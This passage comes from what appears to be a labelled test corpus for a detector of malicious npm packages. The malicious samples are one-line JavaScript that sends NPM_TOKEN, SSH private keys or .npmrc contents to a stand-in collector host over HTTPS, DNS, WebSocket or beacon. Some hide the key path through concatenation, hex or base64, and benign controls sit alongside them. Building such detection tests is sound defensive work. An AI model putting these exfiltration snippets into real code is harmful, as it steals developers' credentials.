+        "packageName": "challenge-secret-urlparams",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-secret-urlparams\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const q=new URLSearchParams({mode:process.env.NODE_ENV}); fetch('https://service.invalid/?'+q);"
+        }
+      }
+    },
+    {
+      "id": "secret-urlparams/benign/custom-extension-entry",
+      "family": "secret-urlparams",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "Credential sent through URLSearchParams.",
+      "evidence": {
+        "packageName": "challenge-secret-urlparams",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-secret-urlparams\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const q=new URLSearchParams({mode:process.env.NODE_ENV}); fetch('https://service.invalid/?'+q);"
+        }
+      }
+    },
+    {
+      "id": "https-end/malicious/entry",
+      "family": "https-end",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "Credential sent through a request stream.",
+      "evidence": {
+        "packageName": "challenge-https-end",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-https-end\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const req=require('https').request('https://collector.invalid',{method:'POST'}); req.end(process.env.NPM_TOKEN);"
+        }
+      }
+    },
+    {
+      "id": "https-end/malicious/test-named-entry",
+      "family": "https-end",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "Credential sent through a request stream.",
+      "evidence": {
+        "packageName": "challenge-https-end",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-https-end\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const req=require('https').request('https://collector.invalid',{method:'POST'}); req.end(process.env.NPM_TOKEN);"
+        }
+      }
+    },
+    {
+      "id": "https-end/malicious/custom-extension-entry",
+      "family": "https-end",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "Credential sent through a request stream.",
+      "evidence": {
+        "packageName": "challenge-https-end",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-https-end\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const req=require('https').request('https://collector.invalid',{method:'POST'}); req.end(process.env.NPM_TOKEN);"
+        }
+      }
+    },
+    {
+      "id": "https-end/benign/entry",
+      "family": "https-end",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "Credential sent through a request stream.",
+      "evidence": {
+        "packageName": "challenge-https-end",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-https-end\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const req=require('https').request('https://service.invalid',{method:'POST'}); req.end('ready');"
+        }
+      }
+    },
+    {
+      "id": "https-end/benign/test-named-entry",
+      "family": "https-end",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "Credential sent through a request stream.",
+      "evidence": {
+        "packageName": "challenge-https-end",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-https-end\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const req=require('https').request('https://service.invalid',{method:'POST'}); req.end('ready');"
+        }
+      }
+    },
+    {
+      "id": "https-end/benign/custom-extension-entry",
+      "family": "https-end",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "Credential sent through a request stream.",
+      "evidence": {
+        "packageName": "challenge-https-end",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-https-end\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const req=require('https').request('https://service.invalid',{method:'POST'}); req.end('ready');"
+        }
+      }
+    },
+    {
+      "id": "dns-secret/malicious/entry",
+      "family": "dns-secret",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "A DNS label exports a credential, without HTTP.",
+      "evidence": {
+        "packageName": "challenge-dns-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-dns-secret\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "require('dns').resolve(Buffer.from(process.env.NPM_TOKEN).toString('hex')+'.collector.invalid',()=>{});"
+        }
+      }
+    },
+    {
+      "id": "dns-secret/malicious/test-named-entry",
+      "family": "dns-secret",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "A DNS label exports a credential, without HTTP.",
+      "evidence": {
+        "packageName": "challenge-dns-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-dns-secret\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "require('dns').resolve(Buffer.from(process.env.NPM_TOKEN).toString('hex')+'.collector.invalid',()=>{});"
+        }
+      }
+    },
+    {
+      "id": "dns-secret/malicious/custom-extension-entry",
+      "family": "dns-secret",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "A DNS label exports a credential, without HTTP.",
+      "evidence": {
+        "packageName": "challenge-dns-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-dns-secret\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "require('dns').resolve(Buffer.from(process.env.NPM_TOKEN).toString('hex')+'.collector.invalid',()=>{});"
+        }
+      }
+    },
+    {
+      "id": "dns-secret/benign/entry",
+      "family": "dns-secret",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "A DNS label exports a credential, without HTTP.",
+      "evidence": {
+        "packageName": "challenge-dns-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-dns-secret\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "require('dns').resolve('service.invalid',()=>{});"
+        }
+      }
+    },
+    {
+      "id": "dns-secret/benign/test-named-entry",
+      "family": "dns-secret",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "A DNS label exports a credential, without HTTP.",
+      "evidence": {
+        "packageName": "challenge-dns-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-dns-secret\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "require('dns').resolve('service.invalid',()=>{});"
+        }
+      }
+    },
+    {
+      "id": "dns-secret/benign/custom-extension-entry",
+      "family": "dns-secret",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "A DNS label exports a credential, without HTTP.",
+      "evidence": {
+        "packageName": "challenge-dns-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-dns-secret\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "require('dns').resolve('service.invalid',()=>{});"
+        }
+      }
+    },
+    {
+      "id": "websocket-secret/malicious/entry",
+      "family": "websocket-secret",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "Credential exported over WebSocket.",
+      "evidence": {
+        "packageName": "challenge-websocket-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-websocket-secret\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const ws=new WebSocket('wss://collector.invalid'); ws.onopen=()=>ws.send(process.env.NPM_TOKEN);"
+        }
+      }
+    },
+    {
+      "id": "websocket-secret/malicious/test-named-entry",
+      "family": "websocket-secret",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "Credential exported over WebSocket.",
+      "evidence": {
+        "packageName": "challenge-websocket-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-websocket-secret\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const ws=new WebSocket('wss://collector.invalid'); ws.onopen=()=>ws.send(process.env.NPM_TOKEN);"
+        }
+      }
+    },
+    {
+      "id": "websocket-secret/malicious/custom-extension-entry",
+      "family": "websocket-secret",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "Credential exported over WebSocket.",
+      "evidence": {
+        "packageName": "challenge-websocket-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-websocket-secret\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const ws=new WebSocket('wss://collector.invalid'); ws.onopen=()=>ws.send(process.env.NPM_TOKEN);"
+        }
+      }
+    },
+    {
+      "id": "websocket-secret/benign/entry",
+      "family": "websocket-secret",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "Credential exported over WebSocket.",
+      "evidence": {
+        "packageName": "challenge-websocket-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-websocket-secret\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const ws=new WebSocket('wss://service.invalid'); ws.onopen=()=>ws.send('ready');"
+        }
+      }
+    },
+    {
+      "id": "websocket-secret/benign/test-named-entry",
+      "family": "websocket-secret",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "Credential exported over WebSocket.",
+      "evidence": {
+        "packageName": "challenge-websocket-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-websocket-secret\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const ws=new WebSocket('wss://service.invalid'); ws.onopen=()=>ws.send('ready');"
+        }
+      }
+    },
+    {
+      "id": "websocket-secret/benign/custom-extension-entry",
+      "family": "websocket-secret",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "Credential exported over WebSocket.",
+      "evidence": {
+        "packageName": "challenge-websocket-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-websocket-secret\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const ws=new WebSocket('wss://service.invalid'); ws.onopen=()=>ws.send('ready');"
+        }
+      }
+    },
+    {
+      "id": "beacon-secret/malicious/entry",
+      "family": "beacon-secret",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "Credential exported via beacon.",
+      "evidence": {
+        "packageName": "challenge-beacon-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-beacon-secret\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "navigator.sendBeacon('https://collector.invalid',process.env.NPM_TOKEN);"
+        }
+      }
+    },
+    {
+      "id": "beacon-secret/malicious/test-named-entry",
+      "family": "beacon-secret",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "Credential exported via beacon.",
+      "evidence": {
+        "packageName": "challenge-beacon-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-beacon-secret\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "navigator.sendBeacon('https://collector.invalid',process.env.NPM_TOKEN);"
+        }
+      }
+    },
+    {
+      "id": "beacon-secret/malicious/custom-extension-entry",
+      "family": "beacon-secret",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "Credential exported via beacon.",
+      "evidence": {
+        "packageName": "challenge-beacon-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-beacon-secret\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "navigator.sendBeacon('https://collector.invalid',process.env.NPM_TOKEN);"
+        }
+      }
+    },
+    {
+      "id": "beacon-secret/benign/entry",
+      "family": "beacon-secret",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "Credential exported via beacon.",
+      "evidence": {
+        "packageName": "challenge-beacon-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-beacon-secret\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "navigator.sendBeacon('https://service.invalid','ready');"
+        }
+      }
+    },
+    {
+      "id": "beacon-secret/benign/test-named-entry",
+      "family": "beacon-secret",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "Credential exported via beacon.",
+      "evidence": {
+        "packageName": "challenge-beacon-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-beacon-secret\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "navigator.sendBeacon('https://service.invalid','ready');"
+        }
+      }
+    },
+    {
+      "id": "beacon-secret/benign/custom-extension-entry",
+      "family": "beacon-secret",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "Credential exported via beacon.",
+      "evidence": {
+        "packageName": "challenge-beacon-secret",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-beacon-secret\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "navigator.sendBeacon('https://service.invalid','ready');"
+        }
+      }
+    },
+    {
+      "id": "ssh-literal/malicious/entry",
+      "family": "ssh-literal",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "SSH private key read then exported; control reads ordinary application data.",
+      "evidence": {
+        "packageName": "challenge-ssh-literal",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-literal\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const key=require('fs').readFileSync(process.env.HOME+'/.ssh/id_rsa'); fetch('https://collector.invalid',{method:'POST',body:key});"
+        }
+      }
+    },
+    {
+      "id": "ssh-literal/malicious/test-named-entry",
+      "family": "ssh-literal",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "SSH private key read then exported; control reads ordinary application data.",
+      "evidence": {
+        "packageName": "challenge-ssh-literal",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-literal\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const key=require('fs').readFileSync(process.env.HOME+'/.ssh/id_rsa'); fetch('https://collector.invalid',{method:'POST',body:key});"
+        }
+      }
+    },
+    {
+      "id": "ssh-literal/malicious/custom-extension-entry",
+      "family": "ssh-literal",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "SSH private key read then exported; control reads ordinary application data.",
+      "evidence": {
+        "packageName": "challenge-ssh-literal",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-literal\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const key=require('fs').readFileSync(process.env.HOME+'/.ssh/id_rsa'); fetch('https://collector.invalid',{method:'POST',body:key});"
+        }
+      }
+    },
+    {
+      "id": "ssh-literal/benign/entry",
+      "family": "ssh-literal",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "SSH private key read then exported; control reads ordinary application data.",
+      "evidence": {
+        "packageName": "challenge-ssh-literal",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-literal\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const data=require('fs').readFileSync('./public-data.json'); fetch('https://service.invalid',{method:'POST',body:data});"
+        }
+      }
+    },
+    {
+      "id": "ssh-literal/benign/test-named-entry",
+      "family": "ssh-literal",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "SSH private key read then exported; control reads ordinary application data.",
+      "evidence": {
+        "packageName": "challenge-ssh-literal",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-literal\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const data=require('fs').readFileSync('./public-data.json'); fetch('https://service.invalid',{method:'POST',body:data});"
+        }
+      }
+    },
+    {
+      "id": "ssh-literal/benign/custom-extension-entry",
+      "family": "ssh-literal",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "SSH private key read then exported; control reads ordinary application data.",
+      "evidence": {
+        "packageName": "challenge-ssh-literal",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-literal\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const data=require('fs').readFileSync('./public-data.json'); fetch('https://service.invalid',{method:'POST',body:data});"
+        }
+      }
+    },
+    {
+      "id": "ssh-split/malicious/entry",
+      "family": "ssh-split",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "Concatenation hides the sensitive path.",
+      "evidence": {
+        "packageName": "challenge-ssh-split",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-split\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const key=require('fs').readFileSync(process.env.HOME+'/.'+'ss'+'h/id_'+'rsa'); fetch('https://collector.invalid',{method:'POST',body:key});"
+        }
+      }
+    },
+    {
+      "id": "ssh-split/malicious/test-named-entry",
+      "family": "ssh-split",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "Concatenation hides the sensitive path.",
+      "evidence": {
+        "packageName": "challenge-ssh-split",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-split\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const key=require('fs').readFileSync(process.env.HOME+'/.'+'ss'+'h/id_'+'rsa'); fetch('https://collector.invalid',{method:'POST',body:key});"
+        }
+      }
+    },
+    {
+      "id": "ssh-split/malicious/custom-extension-entry",
+      "family": "ssh-split",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "Concatenation hides the sensitive path.",
+      "evidence": {
+        "packageName": "challenge-ssh-split",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-split\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const key=require('fs').readFileSync(process.env.HOME+'/.'+'ss'+'h/id_'+'rsa'); fetch('https://collector.invalid',{method:'POST',body:key});"
+        }
+      }
+    },
+    {
+      "id": "ssh-split/benign/entry",
+      "family": "ssh-split",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "Concatenation hides the sensitive path.",
+      "evidence": {
+        "packageName": "challenge-ssh-split",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-split\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const data=require('fs').readFileSync('./pub'+'lic-data.json'); fetch('https://service.invalid',{method:'POST',body:data});"
+        }
+      }
+    },
+    {
+      "id": "ssh-split/benign/test-named-entry",
+      "family": "ssh-split",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "Concatenation hides the sensitive path.",
+      "evidence": {
+        "packageName": "challenge-ssh-split",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-split\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const data=require('fs').readFileSync('./pub'+'lic-data.json'); fetch('https://service.invalid',{method:'POST',body:data});"
+        }
+      }
+    },
+    {
+      "id": "ssh-split/benign/custom-extension-entry",
+      "family": "ssh-split",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "Concatenation hides the sensitive path.",
+      "evidence": {
+        "packageName": "challenge-ssh-split",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-split\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const data=require('fs').readFileSync('./pub'+'lic-data.json'); fetch('https://service.invalid',{method:'POST',body:data});"
+        }
+      }
+    },
+    {
+      "id": "ssh-join/malicious/entry",
+      "family": "ssh-join",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "Array joining hides the sensitive path.",
+      "evidence": {
+        "packageName": "challenge-ssh-join",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-join\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const key=require('fs').readFileSync([process.env.HOME,'.ssh','id_rsa'].join('/')); fetch('https://collector.invalid',{method:'POST',body:key});"
+        }
+      }
+    },
+    {
+      "id": "ssh-join/malicious/test-named-entry",
+      "family": "ssh-join",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "Array joining hides the sensitive path.",
+      "evidence": {
+        "packageName": "challenge-ssh-join",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-join\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const key=require('fs').readFileSync([process.env.HOME,'.ssh','id_rsa'].join('/')); fetch('https://collector.invalid',{method:'POST',body:key});"
+        }
+      }
+    },
+    {
+      "id": "ssh-join/malicious/custom-extension-entry",
+      "family": "ssh-join",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "Array joining hides the sensitive path.",
+      "evidence": {
+        "packageName": "challenge-ssh-join",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-join\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const key=require('fs').readFileSync([process.env.HOME,'.ssh','id_rsa'].join('/')); fetch('https://collector.invalid',{method:'POST',body:key});"
+        }
+      }
+    },
+    {
+      "id": "ssh-join/benign/entry",
+      "family": "ssh-join",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "Array joining hides the sensitive path.",
+      "evidence": {
+        "packageName": "challenge-ssh-join",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-join\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const data=require('fs').readFileSync(['.','public-data.json'].join('/')); fetch('https://service.invalid',{method:'POST',body:data});"
+        }
+      }
+    },
+    {
+      "id": "ssh-join/benign/test-named-entry",
+      "family": "ssh-join",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "Array joining hides the sensitive path.",
+      "evidence": {
+        "packageName": "challenge-ssh-join",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-join\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const data=require('fs').readFileSync(['.','public-data.json'].join('/')); fetch('https://service.invalid',{method:'POST',body:data});"
+        }
+      }
+    },
+    {
+      "id": "ssh-join/benign/custom-extension-entry",
+      "family": "ssh-join",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "Array joining hides the sensitive path.",
+      "evidence": {
+        "packageName": "challenge-ssh-join",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-join\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const data=require('fs').readFileSync(['.','public-data.json'].join('/')); fetch('https://service.invalid',{method:'POST',body:data});"
+        }
+      }
+    },
+    {
+      "id": "ssh-hex/malicious/entry",
+      "family": "ssh-hex",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "Hex escapes hide the sensitive path.",
+      "evidence": {
+        "packageName": "challenge-ssh-hex",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-hex\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const key=require('fs').readFileSync(process.env.HOME+'/.\\x73\\x73h/id_rsa'); fetch('https://collector.invalid',{method:'POST',body:key});"
+        }
+      }
+    },
+    {
+      "id": "ssh-hex/malicious/test-named-entry",
+      "family": "ssh-hex",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "Hex escapes hide the sensitive path.",
+      "evidence": {
+        "packageName": "challenge-ssh-hex",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-hex\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const key=require('fs').readFileSync(process.env.HOME+'/.\\x73\\x73h/id_rsa'); fetch('https://collector.invalid',{method:'POST',body:key});"
+        }
+      }
+    },
+    {
+      "id": "ssh-hex/malicious/custom-extension-entry",
+      "family": "ssh-hex",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "Hex escapes hide the sensitive path.",
+      "evidence": {
+        "packageName": "challenge-ssh-hex",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-hex\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const key=require('fs').readFileSync(process.env.HOME+'/.\\x73\\x73h/id_rsa'); fetch('https://collector.invalid',{method:'POST',body:key});"
+        }
+      }
+    },
+    {
+      "id": "ssh-hex/benign/entry",
+      "family": "ssh-hex",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "Hex escapes hide the sensitive path.",
+      "evidence": {
+        "packageName": "challenge-ssh-hex",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-hex\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const data=require('fs').readFileSync('./\\x70ublic-data.json'); fetch('https://service.invalid',{method:'POST',body:data});"
+        }
+      }
+    },
+    {
+      "id": "ssh-hex/benign/test-named-entry",
+      "family": "ssh-hex",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "Hex escapes hide the sensitive path.",
+      "evidence": {
+        "packageName": "challenge-ssh-hex",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-hex\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const data=require('fs').readFileSync('./\\x70ublic-data.json'); fetch('https://service.invalid',{method:'POST',body:data});"
+        }
+      }
+    },
+    {
+      "id": "ssh-hex/benign/custom-extension-entry",
+      "family": "ssh-hex",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "Hex escapes hide the sensitive path.",
+      "evidence": {
+        "packageName": "challenge-ssh-hex",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-hex\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const data=require('fs').readFileSync('./\\x70ublic-data.json'); fetch('https://service.invalid',{method:'POST',body:data});"
+        }
+      }
+    },
+    {
+      "id": "ssh-base64/malicious/entry",
+      "family": "ssh-base64",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "A base64 literal hides the sensitive path.",
+      "evidence": {
+        "packageName": "challenge-ssh-base64",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-base64\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const key=require('fs').readFileSync(process.env.HOME+Buffer.from('Ly5zc2gvaWRfcnNh','base64').toString()); fetch('https://collector.invalid',{method:'POST',body:key});"
+        }
+      }
+    },
+    {
+      "id": "ssh-base64/malicious/test-named-entry",
+      "family": "ssh-base64",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "A base64 literal hides the sensitive path.",
+      "evidence": {
+        "packageName": "challenge-ssh-base64",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-base64\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const key=require('fs').readFileSync(process.env.HOME+Buffer.from('Ly5zc2gvaWRfcnNh','base64').toString()); fetch('https://collector.invalid',{method:'POST',body:key});"
+        }
+      }
+    },
+    {
+      "id": "ssh-base64/malicious/custom-extension-entry",
+      "family": "ssh-base64",
+      "label": "malicious",
+      "variant": "custom-extension-entry",
+      "rationale": "A base64 literal hides the sensitive path.",
+      "evidence": {
+        "packageName": "challenge-ssh-base64",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-base64\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const key=require('fs').readFileSync(process.env.HOME+Buffer.from('Ly5zc2gvaWRfcnNh','base64').toString()); fetch('https://collector.invalid',{method:'POST',body:key});"
+        }
+      }
+    },
+    {
+      "id": "ssh-base64/benign/entry",
+      "family": "ssh-base64",
+      "label": "benign",
+      "variant": "entry",
+      "rationale": "A base64 literal hides the sensitive path.",
+      "evidence": {
+        "packageName": "challenge-ssh-base64",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-base64\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "const data=require('fs').readFileSync(Buffer.from('Li9wdWJsaWMtZGF0YS5qc29u','base64').toString()); fetch('https://service.invalid',{method:'POST',body:data});"
+        }
+      }
+    },
+    {
+      "id": "ssh-base64/benign/test-named-entry",
+      "family": "ssh-base64",
+      "label": "benign",
+      "variant": "test-named-entry",
+      "rationale": "A base64 literal hides the sensitive path.",
+      "evidence": {
+        "packageName": "challenge-ssh-base64",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-base64\", \"version\": \"1.0.0\", \"main\": \"test/fixture.js\"}",
+          "test/fixture.js": "const data=require('fs').readFileSync(Buffer.from('Li9wdWJsaWMtZGF0YS5qc29u','base64').toString()); fetch('https://service.invalid',{method:'POST',body:data});"
+        }
+      }
+    },
+    {
+      "id": "ssh-base64/benign/custom-extension-entry",
+      "family": "ssh-base64",
+      "label": "benign",
+      "variant": "custom-extension-entry",
+      "rationale": "A base64 literal hides the sensitive path.",
+      "evidence": {
+        "packageName": "challenge-ssh-base64",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-ssh-base64\", \"version\": \"1.0.0\", \"main\": \"payload.dat\"}",
+          "payload.dat": "const data=require('fs').readFileSync(Buffer.from('Li9wdWJsaWMtZGF0YS5qc29u','base64').toString()); fetch('https://service.invalid',{method:'POST',body:data});"
+        }
+      }
+    },
+    {
+      "id": "npmrc-upload/malicious/entry",
+      "family": "npmrc-upload",
+      "label": "malicious",
+      "variant": "entry",
+      "rationale": "npm credentials exported versus a public config file upload.",
+      "evidence": {
+        "packageName": "challenge-npmrc-upload",
+        "sourceFiles": {
+          "package.json": "{\"name\": \"challenge-npmrc-upload\", \"version\": \"1.0.0\", \"main\": \"index.js\"}",
+          "index.js": "fetch('https://collector.invalid',{method:'POST',body:require('fs').readFileSync(process.env.HOME+'/.npmrc')});"
+        }
+      }
+    },
+    {
+      "id": "npmrc-upload/malicious/test-named-entry",
+      "family": "npmrc-upload",
+      "label": "malicious",
+      "variant": "test-named-entry",
+      "rationale": "npm credentials exported versus a public config file upload.",
+      "evidence": {
+        "packageName": "challenge-npmrc-upload",
